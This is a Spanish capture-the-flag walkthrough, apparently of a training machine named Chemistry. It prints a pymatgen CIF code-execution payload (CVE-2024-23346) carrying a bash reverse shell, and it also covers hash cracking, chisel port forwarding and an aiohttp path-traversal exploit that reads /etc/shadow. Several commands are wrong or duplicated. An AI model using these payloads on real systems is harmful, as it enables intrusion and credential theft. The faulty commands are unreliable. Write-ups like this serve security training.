# User flag

Como hacemos usualmente al empezar todas las máquinas, lanzamos un Nmap para escanear los puertos abiertos.

![nmap](Images/nmap.png)

Al hacerlo, encontramos los puertos 22 y 5000 abiertos. Si visitamos el puerto 5000, vemos que hay una aplicación corriendo que nos permite hacer login y registrarnos.

![chemistry-page](Images/chemistry-page.png)

Si nos registramos, accedemos directamente a una página donde podemos subir archivos, lo cual será nuestro vector de ataque principal.

![file-upload](Images/file-upload.png)

Después de ejecutar el Nmap, vi que la página tenía configurado `python`, así que intenté subir un archivo con una reverse shell en su interior, pero recibí una respuesta 405. Seguidamente, me fijé en el ejemplo que la página proporciona, viendo que solo permite la subida de archivos CIF.

Así, probamos a ejecutar una subida de un archivo con doble extensión, en este caso, un archivo PNG.

![extensions](Images/extensions.png)

Al ver que tuvo éxito, intentamos lo mismo con la reverse shell en Python.

Después de hacer la subida con éxito, intentamos ver el archivo y recibimos un error de servidor interno (Internal Server Error). Al comprobar la funcionalidad `View` con un archivo que tenía exclusivamente la extensión `cif`, funcionó correctamente.

Después de una búsqueda en Internet, conseguí encontrar el siguiente exploit: [CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f).
```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("COMMAND");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

De esta manera, al subir un archivo `cif` con este contenido y cambiando `COMMAND` por un comando en bash, se logra ejecutar comandos de manera remota.

Así, si usamos el archivo que nos dan de ejemplo y le añadimos el siguiente payload, podemos conseguir acceso a la máquina víctima:
```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy


 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/<IP>/<PORT> 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

Una vez conseguida la conexión, recomiendo hacer un upgrade de la shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# we need to *restart* to apply the changes, so we do:  
CTRL+Z  
stty raw -echo; fg  
reset xterm
export TERM=xterm
export SHELL=bash
```

Al acceder, vemos que tenemos en posesión el usuario **app** y que la flag de usuario pertenece al usuario **rosa**, por lo que deberemos conseguir acceso al usuario **rosa** para poder ver el contenido de **user.txt**.

![gained-access](Images/gained-access.png)

Si listamos el contenido del directorio `/home` de nuestro usuario, observamos que hay una base de datos disponible, la cual es susceptible de tener credenciales dentro.

![list-bd](Images/list-bd.png)

Para compartir el archivo y abrirlo más cómodamente, copiamos el archivo `database.bd` en el directorio `/tmp` y abrimos un puerto con Python. Seguidamente, hacemos un wget en nuestra máquina para obtener el archivo.

```bash
#target machine
sudo python3 -m http.server 8090
#local machine
wget http://<ip>/linpeas.sh
```

Una vez tenemos el archivo, podemos usar `sqlite3` para interactuar con él y conseguir el hash del usuario **rosa**.

![sqlite3-result](Images/sqlite3-result.png)

Para descifrar la contraseña de **rosa**, usaremos la herramienta **hashcat**.

```bash
hashcat -a 0 -m 0 63ed86ee9f624c7b14f1d4f43dc251a5 /usr/share/wordlists/rockyou.txt
```
![hashcat](Images/hashcat.png)

Una vez conseguida la contraseña, solo tenemos que ejecutar `su rosa` en la máquina víctima para cambiar al usuario **rosa** y mostrar la flag.

![user-flag](Images/user-flag.png)

# Root flag
Para poder revisar posibles vulnerabilidades y realizar la escalada de privilegios con mayor facilidad, podemos usar **linpeas**. Para hacerlo, primero abrimos un puerto en nuestra máquina local donde tengamos el script descargado y, posteriormente, nos dirigimos al directorio `/tmp` de la máquina víctima y obtenemos el archivo:
 
```bash
#local machine
sudo python3 -m http.server 80
#target machine
wget http://<ip>/linpeas.sh
```


## Port Forwarding
 
Para poder revisar posibles vulnerabilidades y facilitar la escalada de privilegios, podemos usar **linpeas**. Para hacerlo, primero abrimos un puerto en nuestra máquina local donde tengamos el script descargado y, posteriormente, nos dirigimos al directorio `/tmp` de la máquina víctima y obtenemos el archivo:
 
```bash
#local machine
sudo python3 -m http.server 80
#target machine
wget http://<ip>/linpeas.sh
```

Al ejecutar **linpeas**, vemos que se nos marcan dos posibles puertos vulnerables (`8080`, `53`), por lo que intentaremos realizar un port forwarding para ver qué servicios pueden estar corriendo en ellos.

Para hacerlo, seguiremos el mismo proceso que con **linpeas**, pero esta vez con **chisel**.

```bash
#local machine
sudo python3 -m http.server 80
#target machine
wget http://<ip>/chisel
```

Una vez instalado **chisel**, debemos ejecutar los siguientes comandos para que funcione el port forwarding:

```bash
#local machine
chisel server -p 9999 --reverse
#target machine
./chisel client <local_ip>:9999 R:8080:127.0.01:8080
```

Posteriormente, si accedemos al puerto especificado en nuestra máquina local, logramos ver la siguiente página:

![site-monitoring](Images/site-monitoring.png)

Interactuando con la página no conseguimos ganar ningún vector de ataque, por lo que lanzamos un **whatweb** para ver si se está usando algún software vulnerable.

![whatweb](Images/whatweb.png)

En la respuesta, vemos que se está usando **Aiohttp** y con una búsqueda rápida nos damos cuenta de que hay un CVE asociado a dicha versión ([CVE-2024-23334](https://github.com/wizarddos/CVE-2024-23334)).

Para usarlo, primero obtenemos el archivo **exploit.py**.

```bash
wget https://raw.githubusercontent.com/wizarddos/CVE-2024-23334/refs/heads/master/exploit.py
```

Se nos dice que para ejecutarlo debemos introducir el siguiente comando:

```bash
python3 exploit.py -u [url] -f [file] -d [static directory]
```

Para saber cuál es el directorio estático, en este caso hay varias opciones: se pueden probar manualmente los distintos directorios o se puede utilizar una herramienta automática para fuzzear directorios, lo que quizás es excesivo para lo que queremos averiguar. En nuestro caso, el directorio estático resultó ser **assets**.

Así entonces, el comando a ejecutar para conseguir la flag de root es:

```bash
python3 exploit.py -u http://localhost:8080 -f /etc/shadow -d /root/root.txt
```
![root-flag](Images/root-flag.png)
